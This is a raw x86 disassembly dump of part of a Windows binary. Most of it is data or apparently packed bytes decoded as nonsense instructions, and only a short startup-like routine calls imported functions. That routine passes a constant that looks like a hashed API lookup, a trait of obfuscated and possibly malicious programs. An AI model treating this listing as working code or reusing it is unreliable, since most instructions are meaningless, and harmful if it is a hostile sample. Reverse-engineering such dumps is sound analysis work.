  422bf9:	dec    ebp
  422bfa:	and    al,0x38
  422bfc:	sti    
  422bfd:	sub    eax,0x136e5e3c
  422c02:	xchg   edi,eax
  422c03:	pop    ebx
  422c04:	xchg   ebx,eax
  422c05:	inc    edx
  422c06:	or     eax,0xd55d54dc
  422c0b:	adc    eax,0x75369d9d
  422c10:	scas   eax,DWORD PTR es:[edi]
  422c11:	pushf  
  422c12:	jne    0x422bf6
  422c14:	dec    bh
  422c16:	sub    BYTE PTR [edi+0x5c5ff25f],0xc3
  422c1d:	push   0x9ce2be1a
  422c22:	stos   BYTE PTR es:[edi],al
  422c23:	add    BYTE PTR [ecx+0x8],ah
  422c26:	push   ebp
  422c27:	aaa    
  422c28:	loop   0x422bd1
  422c2a:	mov    al,ds:0xd5d5668f
  422c2f:	sub    eax,ecx
  422c31:	adc    cl,BYTE PTR [edx]
  422c33:	ins    BYTE PTR es:[edi],dx
  422c34:	pop    ebx
  422c35:	cmp    ebp,DWORD PTR ds:0xfdb58bb2
  422c3b:	scas   al,BYTE PTR es:[edi]
  422c3c:	jle    0x422c12
  422c3e:	mov    dh,bl
  422c40:	daa    
  422c41:	pop    ss
  422c42:	add    al,0xa9
  422c44:	ret    0x9d4
  422c47:	xacquire lock and DWORD PTR [edx+0x7e0b9260],edi
  422c4f:	repz pop ds
  422c51:	push   ebp
  422c52:	push   0x37
  422c54:	mov    ah,0x54
  422c56:	inc    ecx
  422c57:	mov    cl,0xd7
  422c59:	dec    BYTE PTR [edi+edx*1-0x1f5a2b5c]
  422c60:	stos   BYTE PTR es:[edi],al
  422c61:	mov    eax,0x82fce9bd
  422c66:	scas   al,BYTE PTR es:[edi]
  422c67:	dec    esp
  422c68:	sub    edi,DWORD PTR [edi+0x67]
  422c6b:	mov    ecx,0x498178c5
  422c70:	push   ecx
  422c71:	inc    edx
  422c72:	pop    es
  422c73:	dec    esi
  422c74:	mov    BYTE PTR [ebx],bl
  422c76:	pusha  
  422c77:	jmp    0x422c6e
  422c79:	or     BYTE PTR [esi+esi*1+0x45],0x65
  422c7e:	(bad)  
  422c7f:	pop    eax
  422c80:	pop    edi
  422c81:	(bad)  
  422c82:	call   DWORD PTR [edx-0x3c1db9cb]
  422c88:	sbb    DWORD PTR [ebx-0x528429c3],eax
  422c8e:	pop    edx
  422c8f:	and    ecx,edi
  422c91:	(bad)  
  422c93:	in     al,0x81
  422c95:	or     dh,ah
  422c97:	js     0x422c96
  422c99:	sub    eax,DWORD PTR [edx+0x2fb0952e]
  422c9f:	mov    WORD PTR ds:0xd4cf0b09,?
  422ca5:	out    0x31,eax
  422ca7:	shr    BYTE PTR [ecx+0x19cd703a],0x50
  422cae:	xor    dl,0xcc
  422cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cb2:	xchg   ebp,eax
  422cb3:	xor    DWORD PTR [esi-0x77b7b5a7],edx
  422cb9:	push   ebp
  422cba:	adc    ebp,esi
  422cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cbd:	pushf  
  422cbe:	adc    dl,0xa2
  422cc1:	cdq    
  422cc2:	add    BYTE PTR [eax-0x548f8c0e],dl
  422cc8:	inc    edi
  422cc9:	or     BYTE PTR [esi],bl
  422ccb:	jl     0x422c67
  422ccd:	mov    eax,DWORD PTR [ebp-0x7c4f0980]
  422cd3:	jp     0x422cf0
  422cd5:	aaa    
  422cd6:	xor    DWORD PTR [esp+eiz*2+0x52],0x1a
  422cdb:	mov    ebp,0xeb770377
  422ce0:	out    0xd2,al
  422ce2:	pop    ds
  422ce3:	sub    BYTE PTR ds:0xe00e4c64,bl
  422ce9:	aam    0x20
  422ceb:	(bad)  
  422cec:	popf   
  422ced:	test   eax,0x6922ab2f
  422cf2:	add    al,0x51
  422cf4:	inc    edi
  422cf5:	mov    ebp,0xf2a31c8c
  422cfa:	sub    al,0xe5
  422cfc:	pusha  
  422cfd:	iret   
  422cfe:	mov    esp,ss
  422d00:	(bad)  
  422d01:	pop    ebp
  422d02:	gs xchg ch,dl
  422d05:	mov    bh,dl
  422d07:	cmp    BYTE PTR [esi+0xab2bac2],al
  422d0d:	xchg   ecx,eax
  422d0e:	scas   eax,DWORD PTR es:[edi]
  422d0f:	xchg   cl,ah
  422d11:	push   es
  422d12:	cmp    eax,0xd4a98ba6
  422d17:	repz mul BYTE PTR [ebp+edi*2+0x60057e40]
  422d1f:	jns    0x422d96
  422d21:	sub    DWORD PTR [eax+0x58],edi
  422d24:	stos   DWORD PTR es:[edi],eax
  422d25:	scas   eax,DWORD PTR es:[edi]
  422d26:	push   es
  422d27:	mov    ch,0xfd
  422d29:	jae    0x422cc8
  422d2b:	icebp  
  422d2c:	dec    edx
  422d2d:	test   al,0x4d
  422d2f:	imul   ebp,DWORD PTR ds:0xbbb62159,0xefbd7868
  422d39:	and    ebp,DWORD PTR [ebp-0x73]
  422d3c:	and    eax,0xf2111c73
  422d41:	lods   eax,DWORD PTR ss:[esi]
  422d43:	fcomp  DWORD PTR [eax-0x4d202d69]
  422d49:	xchg   ecx,eax
  422d4a:	mov    bh,0xca
  422d4c:	sub    ah,bh
  422d4e:	dec    edi
  422d4f:	push   ds
  422d50:	out    dx,ax
  422d52:	test   edx,edi
  422d54:	enter  0xa9b3,0x7c
  422d58:	inc    ebp
  422d59:	mov    edx,DWORD PTR ds:0x704bf15d
  422d5f:	push   eax
  422d60:	repnz imul edx,ebp,0x4a
  422d64:	lods   al,BYTE PTR ds:[esi]
  422d65:	ret    0x9318
  422d68:	or     esi,DWORD PTR [ecx+0x47]
  422d6b:	shl    esp,0xe4
  422d6e:	cld    
  422d6f:	push   0xe568797a
  422d74:	icebp  
  422d75:	leave  
  422d76:	(bad)  
  422d77:	int3   
  422d78:	xor    eax,0x10ff18f2
  422d7d:	mov    gs,WORD PTR [ecx]
  422d7f:	xchg   ecx,eax
  422d80:	and    eax,0xf638a9bd
  422d85:	and    al,0xfd
  422d87:	pop    ecx
  422d88:	call   0xbb998962
  422d8d:	or     DWORD PTR [eax-0x4e],edi
  422d90:	push   0xffffffbb
  422d92:	push   ss
  422d93:	fld    QWORD PTR [esi-0x1c]
  422d96:	scas   eax,DWORD PTR es:[edi]
  422d97:	cmp    dl,BYTE PTR [edi-0x53eb1633]
  422d9d:	push   ecx
  422d9e:	sbb    bh,cl
  422da0:	call   0xf9629789
  422da5:	sub    al,0xb6
  422da7:	fwait
  422da8:	sbb    edi,DWORD PTR [edi]
  422daa:	mov    ds:0x4a174fa4,eax
  422daf:	push   es
  422db0:	loope  0x422d3c
  422db2:	jns    0x422df6
  422db4:	rol    DWORD PTR [ebx-0x7c],cl
  422db7:	adc    BYTE PTR [ebx-0x3ef96b7a],dh
  422dbd:	pop    ebx
  422dbe:	in     eax,dx
  422dbf:	sub    DWORD PTR [esi],ebp
  422dc1:	and    eax,0x710c2ed
  422dc6:	xchg   DWORD PTR [ecx-0xc],ebx
  422dc9:	test   eax,0xab2135af
  422dce:	fdivr  DWORD PTR [edx]
  422dd0:	jbe    0x422d6b
  422dd2:	js     0x422d61
  422dd4:	sbb    DWORD PTR [esi],esi
  422dd6:	sub    eax,0xbfe040ad
  422ddb:	cli    
  422ddc:	mov    edx,0x24768d2f
  422de1:	and    DWORD PTR ds:0x847c1ff5,esp
  422de7:	push   0x2c
  422de9:	aas    
  422dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422deb:	xchg   esi,eax
  422dec:	xor    al,0x23
  422dee:	mov    eax,0x1
  422df3:	mov    esp,ebp
  422df5:	pop    ebp
  422df6:	ret    
  422df7:	int3   
  422df8:	int3   
  422df9:	int3   
  422dfa:	int3   
  422dfb:	int3   
  422dfc:	int3   
  422dfd:	int3   
  422dfe:	int3   
  422dff:	int3   
  422e00:	push   ebp
  422e01:	mov    ebp,esp
  422e03:	sub    esp,0x8
  422e06:	push   esi
  422e07:	push   0xffff
  422e0c:	push   0x0
  422e0e:	mov    DWORD PTR [ebp-0x4],0x0
  422e15:	call   DWORD PTR ds:0x42902c
  422e1b:	mov    esi,DWORD PTR ds:0x429034
  422e21:	push   0xa
  422e23:	push   0x0
  422e25:	push   0x0
  422e27:	push   0xffffffff
  422e29:	mov    DWORD PTR [ebp-0x8],esi
  422e2c:	call   0x424340
  422e31:	test   esi,esi
  422e33:	jne    0x422e3f
  422e35:	push   esi
  422e36:	push   0x1
  422e38:	push   esi
  422e39:	call   DWORD PTR ds:0x429028
  422e3f:	push   0x0
  422e41:	push   0x4e
  422e43:	push   0x1e
  422e45:	push   0x0
  422e47:	call   DWORD PTR ds:0x429024
  422e4d:	test   eax,eax
  422e4f:	je     0x422e59
  422e51:	push   0x0
  422e53:	call   DWORD PTR ds:0x429008
  422e59:	mov    esi,DWORD PTR [ebp-0x8]
  422e5c:	call   esi
  422e5e:	mov    DWORD PTR [ebp-0x4],eax
  422e61:	mov    esi,DWORD PTR [ebp-0x4]
  422e64:	cmp    esi,0x57
  422e67:	jne    0x422e7e
  422e69:	push   0x76c88bba
  422e6e:	call   0x411080
  422e73:	add    esp,0x4
  422e76:	push   0x0
  422e78:	call   DWORD PTR ds:0x429020
  422e7e:	push   0x5
  422e80:	push   esi
  422e81:	call   DWORD PTR ds:0x42913c
  422e87:	xor    eax,eax
  422e89:	pop    esi
  422e8a:	mov    esp,ebp
  422e8c:	pop    ebp
  422e8d:	ret    
  422e8e:	nop
  422e8f:	nop
  422e90:	sub    esp,0x10
  422e93:	push   0x0
  422e95:	push   0x0
  422e97:	push   0x0
  422e99:	call   DWORD PTR ds:0x429038
  422e9f:	push   0x0
  422ea1:	push   0x0
  422ea3:	call   DWORD PTR ds:0x429148
  422ea9:	lea    eax,[esp+0x0]
  422ead:	push   eax
  422eae:	call   DWORD PTR ds:0x429054
  422eb4:	call   DWORD PTR ds:0x429034
  422eba:	push   0x0
  422ebc:	push   0x0
  422ebe:	push   0x0
  422ec0:	call   0x424346
  422ec5:	cmp    WORD PTR [esp+0x0],0x0
  422ecb:	push   0x0
  422ecd:	je     0x422ee6
  422ecf:	push   0x0
  422ed1:	call   DWORD PTR ds:0x429130
  422ed7:	push   0x0
  422ed9:	call   0x422e00
  422ede:	add    esp,0x4
  422ee1:	jmp    0x42431e
  422ee6:	push   0x14
  422ee8:	push   0x0
  422eea:	push   0x0
  422eec:	call   DWORD PTR ds:0x429010
  422ef2:	jmp    FWORD PTR [esi]
  422ef4:	stos   DWORD PTR es:[edi],eax
  422ef5:	xchg   edx,eax
  422ef6:	(bad)  
  422ef8:	(bad)  
  422ef9:	jmp    0x422f12
  422efb:	mov    al,0xa
  422efd:	out    0x4b,eax
  422eff:	les    ebx,FWORD PTR [ecx+esi*8+0x62f1da02]
  422f06:	jmp    0x422f1f
  422f08:	mov    ah,0xa
  422f0a:	out    0xb,eax
  422f0c:	cmp    esp,DWORD PTR [ebx-0xf]
  422f0f:	add    ah,BYTE PTR [edx-0xf]
  422f12:	(bad)  
  422f13:	jmp    0x422f2c
  422f15:	mov    ah,0xa
  422f17:	out    0x4b,eax
  422f19:	cmp    esp,DWORD PTR [ebx-0xf]
  422f1c:	add    ah,BYTE PTR [edx-0xf]
  422f1f:	(bad)  
  422f20:	jmp    0x422f39
  422f22:	mov    ah,0xa
  422f24:	out    0x4b,eax
  422f26:	cmp    esp,DWORD PTR [ebx-0xf]
  422f29:	add    ah,BYTE PTR [edx-0xf]
  422f2c:	(bad)  
  422f2d:	jmp    0x422f46
  422f2f:	dec    esp
  422f30:	or     ah,bh
  422f32:	dec    ebx
  422f33:	xor    eax,0x620c4b7c
  422f38:	inc    ebp
  422f39:	imul   esp,DWORD PTR [esi],0x36
  422f3c:	or     al,0xb
  422f3e:	stos   DWORD PTR es:[edi],eax
  422f3f:	xchg   BYTE PTR [edx],bl
  422f41:	aaa    
  422f42:	cdq    
  422f43:	imul   edx,DWORD PTR [ecx],0xffffffd1
  422f46:	adc    bl,BYTE PTR [ecx-0x79872c88]
  422f4c:	sbb    eax,DWORD PTR es:[eax]
  422f4f:	nop
  422f50:	ins    BYTE PTR es:[edi],dx
  422f51:	or     al,0x9e
  422f53:	push   ss
  422f54:	retf   
  422f55:	jne    0x422f28
  422f57:	sub    dl,BYTE PTR [ebp-0x67bcaac2]
  422f5d:	ins    BYTE PTR es:[edi],dx
  422f5e:	inc    edx
  422f5f:	mov    ch,0x2d
  422f61:	mov    eax,0x8365d937
  422f66:	cs adc eax,0x4608fc6e
  422f6c:	icebp  
  422f6d:	(bad)  
  422f6e:	jmp    0x422f87
  422f70:	mov    ah,0xa
  422f72:	out    0x4c,eax
  422f74:	mov    ds:0x9a41a89f,al
  422f79:	arpl   WORD PTR [eax-0x58],bp
  422f7c:	out    dx,eax
  422f7d:	add    BYTE PTR es:[ebx+esi*4+0x67a969a9],ah
  422f85:	outs   dx,BYTE PTR ds:[esi]
  422f86:	sti    
  422f87:	cmp    eax,0x52be8513
  422f8c:	xor    BYTE PTR [ebx+0x31],0xa1
  422f90:	or     DWORD PTR [eax-0x2df85698],edx
  422f96:	sbb    eax,0x4175f2dc
  422f9b:	pop    ss
  422f9c:	in     eax,dx
  422f9d:	enter  0x2408,0x9
  422fa1:	lock loope 0x423001
  422fa4:	xor    al,0x1b
  422fa6:	in     eax,dx
  422fa7:	add    ebx,eax
  422fa9:	icebp  
  422faa:	sti    
  422fab:	dec    eax
  422fac:	loop   0x422f9e
  422fae:	push   0x26efb3
  422fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fb4:	mov    bl,0xa8
  422fb6:	imul   ebx,ecx,0xddfbf0fb
  422fbc:	xor    edx,DWORD PTR [edi-0x26e0b842]
  422fc2:	xor    DWORD PTR [ebx],edi
  422fc4:	xchg   esp,eax
  422fc5:	aas    
  422fc6:	push   0x1d799af9
  422fcb:	in     al,dx
  422fcc:	outs   dx,DWORD PTR ds:[esi]
  422fcd:	out    dx,eax
  422fce:	inc    ecx
  422fcf:	jns    0x422f6c
  422fd1:	arpl   WORD PTR [eax],cx
  422fd3:	cmp    dl,BYTE PTR [ebp+ebp*2-0x67b3aa1f]
  422fda:	in     eax,dx
  422fdb:	sbb    DWORD PTR [edx+0x0],edx
  422fde:	cdq    
  422fdf:	inc    ecx
  422fe0:	call   0xab4:0x17eb6863
  422fe7:	out    0x4b,eax
  422fe9:	cmp    esp,DWORD PTR [ebx-0x5f]
  422fec:	inc    edi
  422fed:	(bad)
  422ff2:	mov    ah,0xe6
  422ff4:	add    al,0x14
  422ff6:	je     0x42305b
  422ff8:	icebp  
  422ff9:	add    ah,BYTE PTR [edx-0xf]
  422ffc:	(bad)  
  422ffd:	jmp    0x423016
  422fff:	push   esp
  423000:	or     ah,ah
  423002:	dec    edx
  423003:	xor    BYTE PTR [edx-0x5],ah
  423006:	add    ah,BYTE PTR [edx+0x1d]
  423009:	data16 jmp 0x423023
  42300c:	mov    al,0xc
  42300e:	out    0x4b,eax
  423010:	cmp    esp,DWORD PTR [ebx-0xf]
  423013:	add    ebx,edi
  423015:	icebp  
  423016:	(bad)  
  423017:	jmp    0x423020
  423019:	mov    ah,0xa
  42301b:	out    0x4b,eax
  42301d:	ds arpl cx,si
  423020:	add    ah,BYTE PTR [ebx]
  423022:	icebp  
  423023:	(bad)  
  423024:	sti    
  423025:	pop    ss
  423026:	mov    ah,0xa
  423028:	in     eax,0x4b
  42302a:	cmp    esp,DWORD PTR [esi-0xf]
  42302d:	add    esp,DWORD PTR [edx-0xf]
  423030:	(bad)  
  423031:	jmp    0x42304a
  423033:	mov    cl,0xa
  423035:	out    0x4b,al
  423037:	cmp    esp,DWORD PTR [ebx-0xf]
  42303a:	add    ah,BYTE PTR [edx+0x71]
  42303d:	imul   ebp,ebx,0xe70ab017
  423043:	test   BYTE PTR [edx],0x66
  423046:	icebp  
  423047:	add    BYTE PTR [edx-0xf],ah
  42304a:	loop   0x423037
  42304c:	pop    ss
  42304d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42304e:	or     ah,bh
  423050:	pop    ebx
  423051:	cmp    esp,DWORD PTR [ebx-0xf]
  423054:	add    dh,BYTE PTR [edx-0xf]
  423057:	(bad)  
  423058:	sti    
  423059:	pop    ss
  42305a:	mov    ah,0xa
  42305c:	out    0x4b,eax
  42305e:	cmp    esi,DWORD PTR [ebx-0xf]
  423061:	add    ah,BYTE PTR [edx-0xf]
  423064:	(bad)  
  423065:	jmp    0x42307e
  423067:	mov    ah,0xa
  423069:	out    0x4b,eax
  42306b:	mov    edi,0xb02fa0d
  423070:	repnz (bad) 
  423072:	jmp    0x42308b
  423074:	test   BYTE PTR [ecx],al
  423076:	out    0x84,eax
  423078:	push   es
  423079:	arpl   cx,si
  42307b:	add    ah,BYTE PTR [edx-0xf]
  42307e:	(bad)  
  42307f:	jmp    0x423098
  423081:	mov    ah,0xa
  423083:	out    0x4b,eax
  423085:	cmp    esp,DWORD PTR [ebx-0xf]
  423088:	add    ah,BYTE PTR [edx-0xf]
  42308b:	(bad)  
  42308c:	jmp    0x4230a5
  42308e:	mov    ah,0xa
  423090:	out    0x4b,eax
  423092:	cmp    esp,DWORD PTR [ebx-0xf]
  423095:	add    ah,BYTE PTR [edx-0xf]
  423098:	(bad)  
  423099:	jmp    0x4230b2
  42309b:	mov    ah,0xa
  42309d:	out    0x4b,eax
  42309f:	cmp    esp,DWORD PTR [ebx-0xf]
  4230a2:	add    ah,BYTE PTR [edx-0xf]
  4230a5:	(bad)  
  4230a6:	jmp    0x4230bf
  4230a8:	mov    ah,0xa
  4230aa:	out    0x4b,eax
  4230ac:	cmp    esp,DWORD PTR [ebx-0xf]
  4230af:	add    ah,BYTE PTR [edx-0xf]
  4230b2:	(bad)  
  4230b3:	jmp    0x4230cc
  4230b5:	mov    ah,0xa
  4230b7:	out    0x4b,eax
  4230b9:	cmp    esp,DWORD PTR [ebx-0xf]
  4230bc:	add    ah,BYTE PTR [edx-0xf]
  4230bf:	(bad)  
  4230c0:	jmp    0x4230d9
  4230c2:	mov    ah,0xa
  4230c4:	out    0x4b,eax
  4230c6:	cmp    esp,DWORD PTR [ebx-0xf]
  4230c9:	add    ah,BYTE PTR [edx-0xf]
  4230cc:	(bad)  
  4230cd:	jmp    0x4230e6
  4230cf:	mov    ah,0xa
  4230d1:	out    0x4b,eax
  4230d3:	cmp    esp,DWORD PTR [ebx-0xf]
  4230d6:	add    ah,BYTE PTR [edx-0xf]
  4230d9:	(bad)  
  4230da:	jmp    0x4230f3
  4230dc:	mov    ah,0xa
  4230de:	out    0x4b,eax
  4230e0:	cmp    esp,DWORD PTR [ebx-0xf]
  4230e3:	sub    al,0x16
  4230e5:	xchg   esp,eax
  4230e6:	sbb    bl,BYTE PTR [edi-0x18f54be9]
  4230ec:	imul   esi,DWORD PTR [eax],0x63
  4230ef:	icebp  
  4230f0:	adc    ah,BYTE PTR [edx-0xf]
  4230f3:	(bad)  
  4230f5:	adc    esi,DWORD PTR [edx+ecx*1+0x333b4be3]
  4230fc:	mov    ah,0x41
  4230fe:	push   eax
  4230ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423100:	sub    eax,0xab417eb
  423105:	out    0x4b,eax
  423107:	sbb    esp,DWORD PTR [ebx-0xf]
  42310a:	loop   0x423158
  42310c:	adc    DWORD PTR [ecx],0xffffff99
  42310f:	je     0x4230c5
  423111:	or     ah,bh
  423113:	dec    ebx
  423114:	imul   esp,DWORD PTR [ebx-0xf],0x2
  423118:	push   edx
  423119:	cli    
  42311a:	(bad)  
  42311b:	jmp    0x423164
  42311d:	mov    ah,0xa
  42311f:	out    0x75,eax
  423121:	aas    
  423122:	arpl   cx,si
  423124:	add    ah,BYTE PTR [edx-0xf]
  423127:	(bad)  
  423128:	jmp    0x423141
  42312a:	mov    ah,0xa
  42312c:	out    0x4b,eax
  42312e:	cmp    eax,DWORD PTR [ebx-0xf]
  423131:	add    al,BYTE PTR [edx+0x17eb62f1]
  423137:	mov    ah,0xa
  423139:	out    0x4b,eax
  42313b:	cmp    esp,DWORD PTR [ebx-0xf]
  42313e:	add    ah,BYTE PTR [edx-0xf]
  423141:	(bad)  
  423142:	jmp    0x42315b
  423144:	mov    ah,0xa
  423146:	out    0x4b,eax
  423148:	cmp    esp,DWORD PTR [ebx-0xf]
  42314b:	add    ah,BYTE PTR [edx-0xf]
  42314e:	(bad)  
  42314f:	jmp    0x423168
  423151:	mov    ah,0xa
  423153:	out    0x4b,eax
  423155:	cmp    esp,DWORD PTR [ebx-0xf]
  423158:	add    ah,BYTE PTR [edx-0xf]
  42315b:	(bad)  
  42315c:	jmp    0x423175
  42315e:	mov    ah,0xa
  423160:	out    0x4b,eax
  423162:	cmp    esp,DWORD PTR [ebx-0xf]
  423165:	add    ah,BYTE PTR [edx-0xf]
  423168:	(bad)  
  423169:	jmp    0x423182
  42316b:	mov    ah,0xa
  42316d:	out    0x4b,eax
  42316f:	cmp    esp,DWORD PTR [ebx-0xf]
  423172:	add    ah,BYTE PTR [edx-0xf]
  423175:	(bad)  
  423176:	jmp    0x42318f
  423178:	mov    ah,0xa
  42317a:	out    0x4b,eax
  42317c:	cmp    esp,DWORD PTR [ebx-0xf]
  42317f:	add    ah,BYTE PTR [edx-0xf]
  423182:	(bad)  
  423183:	jmp    0x42319c
  423185:	mov    ah,0xa
  423187:	out    0x4b,eax
  423189:	cmp    esp,DWORD PTR [ebx-0xf]
  42318c:	add    ah,BYTE PTR [edx-0xf]
  42318f:	(bad)  
  423190:	jmp    0x4231a9
  423192:	mov    ah,0xa
  423194:	out    0x4b,eax
  423196:	cmp    esp,DWORD PTR [ebx-0xf]
  423199:	add    ah,BYTE PTR [edx-0xf]
  42319c:	(bad)  
  42319d:	jmp    0x4231b6
  42319f:	mov    ah,0xa
  4231a1:	out    0x4b,eax
  4231a3:	cmp    esp,DWORD PTR [ebx-0xf]
  4231a6:	add    ah,BYTE PTR [edx-0xf]
  4231a9:	(bad)  
  4231aa:	jmp    0x4231c3
  4231ac:	mov    ah,0xa
  4231ae:	out    0x4b,eax
  4231b0:	cmp    esp,DWORD PTR [ebx-0xf]
  4231b3:	add    ah,BYTE PTR [edx-0xf]
  4231b6:	(bad)  
  4231b7:	jmp    0x4231d0
  4231b9:	mov    ah,0xa
  4231bb:	out    0x4b,eax
  4231bd:	cmp    esp,DWORD PTR [ebx-0xf]
  4231c0:	add    ah,BYTE PTR [edx-0xf]
  4231c3:	(bad)  
  4231c4:	jmp    0x4231dd
  4231c6:	mov    ah,0xa
  4231c8:	out    0x4b,eax
  4231ca:	cmp    esp,DWORD PTR [ebx-0xf]
  4231cd:	add    ah,BYTE PTR [edx-0xf]
  4231d0:	(bad)  
  4231d1:	jmp    0x4231ea
  4231d3:	mov    ah,0xa
  4231d5:	out    0x4b,eax
  4231d7:	cmp    esp,DWORD PTR [ebx-0xf]
  4231da:	add    ah,BYTE PTR [edx-0xf]
  4231dd:	(bad)  
  4231de:	jmp    0x4231f7
  4231e0:	mov    ah,0xa
  4231e2:	out    0x4b,eax
  4231e4:	cmp    esp,DWORD PTR [ebx-0xf]
  4231e7:	add    ah,BYTE PTR [edx-0xf]
  4231ea:	(bad)  
  4231eb:	jmp    0x423204
  4231ed:	mov    ah,0xa
  4231ef:	out    0x4b,eax
  4231f1:	cmp    esp,DWORD PTR [ebx-0xf]
  4231f4:	add    ah,BYTE PTR [edx-0xf]
  4231f7:	(bad)  
  4231f8:	jmp    0x423211
  4231fa:	mov    ah,0xa
  4231fc:	out    0x4b,eax
  4231fe:	cmp    esp,DWORD PTR [ebx-0xf]
  423201:	add    ah,BYTE PTR [edx-0xf]
  423204:	(bad)  
  423205:	jmp    0x42321e
  423207:	mov    ah,0xa
  423209:	out    0x4b,eax
  42320b:	cmp    esp,DWORD PTR [ebx-0xf]
  42320e:	add    ah,BYTE PTR [edx-0xf]
  423211:	(bad)  
  423212:	jmp    0x42322b
  423214:	mov    ah,0xa
  423216:	out    0x4b,eax
  423218:	cmp    esp,DWORD PTR [ebx-0xf]
  42321b:	add    ah,BYTE PTR [edx-0xf]
  42321e:	(bad)  
  42321f:	jmp    0x423238
  423221:	mov    ah,0xa
  423223:	out    0x4b,eax
  423225:	cmp    esp,DWORD PTR [ebx-0xf]
  423228:	add    ah,BYTE PTR [edx-0xf]
  42322b:	(bad)  
  42322c:	jmp    0x423245
  42322e:	mov    ah,0xa
  423230:	out    0x4b,eax
  423232:	cmp    esp,DWORD PTR [ebx-0xf]
  423235:	add    ah,BYTE PTR [edx-0xf]
  423238:	(bad)  
  423239:	jmp    0x423252
  42323b:	mov    ah,0xa
  42323d:	out    0x4b,eax
  42323f:	cmp    esp,DWORD PTR [ebx-0xf]
  423242:	add    ah,BYTE PTR [edx-0xf]
  423245:	(bad)  
  423246:	jmp    0x42325f
  423248:	mov    ah,0xa
  42324a:	out    0x4b,eax
  42324c:	cmp    esp,DWORD PTR [ebx-0xf]
  42324f:	add    ah,BYTE PTR [edx-0xf]
  423252:	(bad)  
  423253:	jmp    0x42326c
  423255:	mov    ah,0xa
  423257:	out    0x4b,eax
  423259:	cmp    esp,DWORD PTR [ebx-0xf]
  42325c:	add    ah,BYTE PTR [edx-0xf]
  42325f:	(bad)  
  423260:	jmp    0x423279
  423262:	mov    ah,0xa
  423264:	out    0x4b,eax
  423266:	cmp    esp,DWORD PTR [ebx-0xf]
  423269:	add    ah,BYTE PTR [edx-0xf]
  42326c:	(bad)  
  42326d:	jmp    0x423286
  42326f:	mov    ah,0xa
  423271:	out    0x4b,eax
  423273:	cmp    esp,DWORD PTR [ebx-0xf]
  423276:	add    ah,BYTE PTR [edx-0xf]
  423279:	(bad)  
  42327a:	jmp    0x423293
  42327c:	mov    ah,0xa
  42327e:	out    0x4b,eax
  423280:	cmp    esp,DWORD PTR [ebx-0xf]
  423283:	add    ah,BYTE PTR [edx-0xf]
  423286:	(bad)  
  423287:	jmp    0x4232a0
  423289:	mov    ah,0xa
  42328b:	out    0x4b,eax
  42328d:	cmp    esp,DWORD PTR [ebx-0xf]
  423290:	add    ah,BYTE PTR [edx-0xf]
  423293:	(bad)  
  423294:	jmp    0x4232ad
  423296:	mov    ah,0xa
  423298:	out    0x4b,eax
  42329a:	cmp    esp,DWORD PTR [ebx-0xf]
  42329d:	add    ah,BYTE PTR [edx-0xf]
  4232a0:	(bad)  
  4232a1:	jmp    0x4232ba
  4232a3:	mov    ah,0xa
  4232a5:	out    0x4b,eax
  4232a7:	cmp    esp,DWORD PTR [ebx-0xf]
  4232aa:	add    ah,BYTE PTR [edx-0xf]
  4232ad:	(bad)  
  4232ae:	jmp    0x4232c7
  4232b0:	mov    ah,0xa
  4232b2:	out    0x4b,eax
  4232b4:	cmp    esp,DWORD PTR [ebx-0xf]
  4232b7:	add    ah,BYTE PTR [edx-0xf]
  4232ba:	(bad)  
  4232bb:	jmp    0x4232d4
  4232bd:	mov    ah,0xa
  4232bf:	out    0x4b,eax
  4232c1:	cmp    esp,DWORD PTR [ebx-0xf]
  4232c4:	add    ah,BYTE PTR [edx-0xf]
  4232c7:	(bad)  
  4232c8:	jmp    0x4232e1
  4232ca:	mov    ah,0xa
  4232cc:	out    0x4b,eax
  4232ce:	cmp    esp,DWORD PTR [ebx-0xf]
  4232d1:	add    ah,BYTE PTR [edx-0xf]
  4232d4:	(bad)  
  4232d5:	jmp    0x4232ee
  4232d7:	mov    ah,0xa
  4232d9:	out    0x4b,eax
  4232db:	cmp    esp,DWORD PTR [ebx-0xf]
  4232de:	add    ah,BYTE PTR [edx-0xf]
  4232e1:	(bad)  
  4232e2:	jmp    0x4232fb
  4232e4:	mov    ah,0xa
  4232e6:	out    0x4b,eax
  4232e8:	cmp    esp,DWORD PTR [ebx-0xf]
  4232eb:	add    ah,BYTE PTR [edx-0xf]
  4232ee:	(bad)  
  4232ef:	jmp    0x423308
  4232f1:	mov    ah,0xa
  4232f3:	mov    al,ds:0xde6331a5
  4232f8:	add    ah,BYTE PTR [edx-0x1f]
  4232fb:	(bad)  
  4232fc:	jmp    0x42333b
  4232fe:	push   ss
  4232ff:	rcl    BYTE PTR [esi+0x6f4ec42d],1
  423305:	test   DWORD PTR [edx],esi
  423307:	sbb    al,0x54
  423309:	add    eax,DWORD PTR [eax+eax*1]
  42330c:	lahf   
  42330d:	cmp    DWORD PTR [edx],0xb3e239bf
  423313:	aad    0xe7
  423315:	(bad)  
  423316:	setge  BYTE PTR ds:0xab29c9cc
  42331d:	pop    esp
  42331e:	enter  0x2d31,0x40
  423322:	jne    0x4232ed
  423324:	pop    ss
  423325:	xchg   ebx,eax
  423326:	lods   eax,DWORD PTR ds:[esi]
  423327:	outs   dx,DWORD PTR ds:[esi]
  423328:	push   ds
  423329:	push   0xe
  42332b:	pop    eax
  42332c:	xor    BYTE PTR [edi+0x2c],bl
  42332f:	jbe    0x42338b
  423331:	ja     0x4232d7
  423333:	push   ecx
  423334:	rcr    DWORD PTR [edx-0x2c],0xa
  423338:	push   eax
  423339:	outs   dx,BYTE PTR ds:[esi]
  42333a:	test   DWORD PTR [ebx+0x4e],ecx
  42333d:	sub    al,0x9a
  42333f:	loopne 0x423335
  423341:	sar    DWORD PTR [ebx],1
  423343:	idiv   dl
  423345:	repz mov ds:0x92f5f5ab,al
  42334b:	sub    BYTE PTR [eax-0x6a050581],ch
  423351:	mov    ah,0x6a
  423353:	fisub  DWORD PTR ds:0x1aa26ebb
  423359:	fdiv   DWORD PTR [eax-0x628cb993]
  42335f:	pop    ss
  423360:	cmc    
  423361:	pop    edi
  423362:	sti    
  423363:	pop    es
  423364:	mov    ebp,0x279477a1
  423369:	sub    ebp,ebp
  42336b:	sub    BYTE PTR [edx-0x4de77f1a],dh
  423371:	mov    al,ds:0x47216c94
  423376:	dec    edi
